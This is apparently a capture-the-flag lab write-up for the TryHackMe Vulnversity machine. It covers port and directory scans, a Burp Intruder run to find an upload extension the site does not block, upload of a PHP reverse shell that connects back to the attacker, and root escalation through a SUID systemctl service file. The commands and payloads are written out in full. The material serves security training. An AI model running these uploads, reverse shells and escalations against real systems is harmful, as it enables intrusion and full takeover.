# What I learned
- BurpSuite Intruder
- priv esc using systemctl

# Recon
```console
kali@kali:~/vulnUniversity$ nmap -p- 10.10.154.5 # what port are open
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 19:32 EDT
Nmap scan report for 10.10.154.5
Host is up (0.045s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes

Nmap done: 1 IP address (1 host up) scanned in 22.64 seconds
kali@kali:~/vulnUniversity$ nmap -p3128 -sV 10.10.154.5 # check service version on port 3128
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 19:34 EDT
Nmap scan report for 10.10.154.5
Host is up (0.045s latency).

PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 3.5.12

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds

kali@kali:~/vulnUniversity$ nmap -p3333 -sV 10.10.154.5 # http and OS
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 19:47 EDT
Nmap scan report for 10.10.154.5
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
3333/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.23 seconds
```
# [Task 3] Locating directories using GoBuster 
```console
kali@kali:~/vulnUniversity$ gobuster dir -u http://10.10.154.5:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.154.5:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/30 19:52:11 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/internal (Status: 301)
===============================================================
2020/05/30 20:03:18 Finished
=========================================================
```
Try each one of them and find out

# Compromise the webserver

seem like we cannot up load [shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) which mean that we cannot upload our reverse shell. But the website might allow us to upload another php extension file. In this case, we wil use `Intruder` in `BurpSuite` (used for automating customised attacks). the list belows show all the file extension we will try. Moreover, there are commonfile extension list which you can also use. but in this case we only focus on php reverse shell 

```
php
php3
php4
php5
phtml
```

now open `BurpSuite` and try to upload our shell on the website. Intercept the post request but do not forward it. Press `Action` and forward it to `Intruder`. Now go to payload tab and add this:

![payloads](pic/Screenshot%202020-07-14%20at%2023.43.34.png)


to advoid go thru every singel response we will use a `Grep - Macth` which can be found in `Option` tab. Here we will try to grep error messege `Extension not allowed` or `not allowed`
![grep](pic/Screenshot%202020-07-14%20at%2023.43.41.png)


To replace our payload in our post request, go to `Position` and add § as the picture below
![position](pic/Screenshot%202020-07-14%20at%2023.43.27.png)
Now start the actack.

here is the result:
![result](pic/Screenshot%202020-07-14%20at%2023.43.20.png)


so now let download our php reverse shell and change file extension toll phtml since it is not block by the website
```console
kali@kali:~/THM$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
kali@kali:~/THM$ ls
AD  kuroHat.ovpn  mrRobot  phpext.txt  php-reverse-shell.php
kali@kali:~/THM$ mv php-reverse-shell.php php-reverse-shell.phtml
kali@kali:~/THM$ ls
AD  kuroHat.ovpn  mrRobot  phpext.txt  php-reverse-shell.phtml
```
Before uploading the shell, dont forget to change the IP and PORT in the script. Upload it. and run nc listening to the port. To execute our payload visite `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml`
```console
connect to [10.8.14.151] from (UNKNOWN) [10.10.220.103] 41216
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:37:58 up 48 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ which python
/usr/bin/python
$ python -c 'import pty; pty.spawn("/bin/sh")' # Spawning a TTY Shell
```
check /home for user and /home/username for flag

# Privilege Escalation 
sudo -L will not works since we do not have www-data password. what we need to do is find SUID. To find SUID with root privilage run:
```console
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
```
After some digging. The most insteresting SUID is  `/bin/systemctl`. I check [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/) and found this:
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
```
to understand more about it credit [F*NGsec](https://fnginfosec.github.io/tryhackme/vulnversity.html)

- `TF=$(mktemp).service`: we will create a new environment variable called “TF” (the name can be anything). Next, we will be using the mktemp command to create a new temporary file as a system service file
- `echo '[Service]`: use the echo command to enter an input into the system. The single quote (‘) will allow us to enter into multi-line mode so we can enter the rest of the commands
- `Type=oneshot`: declare the service as oneshot, which means that the service will execute the action and then immediately exit
- `ExecStart=/bin/sh -c "id > /tmp/output"`: when the service starts, use the sh command to execute (-c) everything inside the double quotes. This will send the results of the command “id” into a file named output in the tmp directory
- `[Install]`: denotes the second part of our system services file
- `WantedBy=multi-user.target' > $TF`: set the service to run once it reaches a certain runlevel. Multi-user.target is runlevel 3, while a functional Linux OS with GUI is runlevel 5. This dependency input and everything before is then redirected into the TF variable. The single quote after target is to denote the end of our echo entry.
- `Systemctl link $TF`: link the TF variable to systemctl so it can be executed by systemctl even though it’s in a different path from other service files
- `systemctl enable --now $TF`: enable the service file stored in the TF variable immediately. It will reload the system manager to ensure the changes are in effect


Note that we do not have `www-data` password which is why we will need to modify it a little bit: 
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```

let try it out
```console
$ TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TFTF=$(mktemp).service
$ echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
> > > > $ Created symlink from /etc/systemd/system/tmp.Smp1tZNwmJ.service to /tmp/tmp.Smp1tZNwmJ.service.
$ 
systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.Smp1tZNwmJ.service to /tmp/tmp.Smp1tZNwmJ.service.
$ ls /tmp       
ls /tmp
output
$ cat /tmp/output
cat /tmp/output
uid=0(root) gid=0(root) groups=0(root)
```
yep it works. as you we use systemctl to esacalated to root priv. now we can use it to `cat root.txt` to get root flag:
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```
now let do it
```console
$ TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TFTF=$(mktemp).service
$ echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
> > > > $ Created symlink from /etc/systemd/system/tmp.u4QO9AG4pI.service to /tmp/tmp.u4QO9AG4pI.service.
$ 
systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.u4QO9AG4pI.service to /tmp/tmp.u4QO9AG4pI.service.
$ cat /tmp/flag
cat /tmp/flag
```